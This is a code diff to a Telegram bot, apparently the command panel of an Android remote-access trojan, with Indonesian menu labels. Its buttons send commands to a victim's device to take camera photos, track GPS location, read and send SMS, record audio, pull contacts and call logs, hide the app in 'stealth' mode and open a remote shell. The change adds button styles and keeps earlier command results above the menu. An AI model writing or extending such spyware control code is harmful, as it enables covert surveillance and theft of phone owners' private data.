@@ -450,15 +450,17 @@ Format Eksekusi Manual:
 
         let menuBtns = [];
         if (!isSecret) {
+            // --- MENU UTAMA: Status & Akses Cepat ---
             menuBtns = [
                 [{ text: `📊 Mode: ${modeLabel} (Switch)`, callback_data: `runcmd:${devId}:set_polling_mode ${nextMode}` }],
-                [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi GPS', callback_data: `runcmd:${devId}:location` }],
+                [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi GPS', callback_data: `runcmd:${devId}:location`, style: 'primary' }],
                 [{ text: '📸 Foto (Blkng)', callback_data: `runcmd:${devId}:photo back` }, { text: '🤳 Foto (Depan)', callback_data: `runcmd:${devId}:photo front` }],
                 [{ text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }, { text: 'ℹ️ Info Sistem', callback_data: `runcmd:${devId}:get_device_info` }],
-                [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0` }],
-                [{ text: '🛠 Fitur Lanjutan', callback_data: `secret_menu:${devId}` }]
+                [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0`, style: 'primary' }],
+                [{ text: '🛠 Fitur Lanjutan', callback_data: `secret_menu:${devId}`, style: 'danger' }]
             ];
         } else {
+            // --- FITUR LANJUTAN: Kontrol & Data Sensitif ---
             menuBtns = [
                 [{ text: '✉️ Kirim SMS', callback_data: `runcmd:${devId}:sms_send` }, { text: '🔊 Record Audio', callback_data: `runcmd:${devId}:record_sound` }],
                 [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '☎️ Call Log', callback_data: `runcmd:${devId}:get_call_logs` }, { text: '📲 Dial', callback_data: `runcmd:${devId}:dial_number` }],
@@ -466,24 +468,44 @@ Format Eksekusi Manual:
                 [{ text: '🗣 TTS', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Notify', callback_data: `runcmd:${devId}:notify` }, { text: '💬 Toast', callback_data: `runcmd:${devId}:show_toast` }],
                 [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }, { text: '🎵 Sound', callback_data: `runcmd:${devId}:play_sound` }],
                 [{ text: '📻 Volume', callback_data: `runcmd:${devId}:set_volume` }, { text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '📶 WiFi', callback_data: `runcmd:${devId}:wifi_scan` }],
-                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }, { text: '🚨 Alarm', callback_data: `runcmd:${devId}:play_alarm` }],
-                [{ text: '👻 Hide Stealth', callback_data: `runcmd:${devId}:hide_app` }, { text: '💻 Shell', callback_data: `runcmd:${devId}:shell` }],
-                [{ text: '🏠 Kembali ke Utama', callback_data: `select_dev:${devId}` }]
+                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }, { text: '🚨 Alarm', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
+                [{ text: '👻 Hide Stealth', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '💻 Shell', callback_data: `runcmd:${devId}:shell`, style: 'danger' }],
+                [{ text: '🏠 Kembali ke Utama', callback_data: `select_dev:${devId}`, style: 'success' }]
             ];
         }
 
         const rawText = ctx.callbackQuery?.message?.text || '';
+        // Deteksi apakah pesan saat ini berisi hasil/respon agar tidak tertimpa
+        const isResult = rawText && (
+            rawText.includes('Respon') ||
+            rawText.includes('Data') ||
+            rawText.includes('Berhasil') ||
+            rawText.includes('Jepretan') ||
+            rawText.includes('Rekaman') ||
+            rawText.includes('Hasil') ||
+            rawText.includes('📍 Lokasi')
+        );
+
         const greeting = `🎯 <b>Menu ${isSecret ? 'Lanjutan' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;
-        menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices' }]);
+        
+        // Jika ada hasil, tempelkan menu di bawah hasil tersebut
+        let caption = greeting;
+        if (isResult) {
+            const oldContent = rawText.split('🎯 Menu')[0].replace('⏳ Menunggu Respon...', '').trim();
+            caption = `${oldContent}\n\n${greeting}`;
+        }
+
+        menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }]);
+        const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } };
         
         const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
         await clearPreviousNav(chatId);
 
         try {
-            const sent = await ctx.editMessageText(greeting, { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } });
+            const sent = await ctx.editMessageText(caption, opts);
             if (sent?.message_id) trackNav(chatId, sent.message_id);
         } catch (e) {
-            const sent = await ctx.reply(greeting, { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } });
+            const sent = await ctx.reply(caption, opts);
             if (sent?.message_id) trackNav(chatId, sent.message_id);
         }
     };
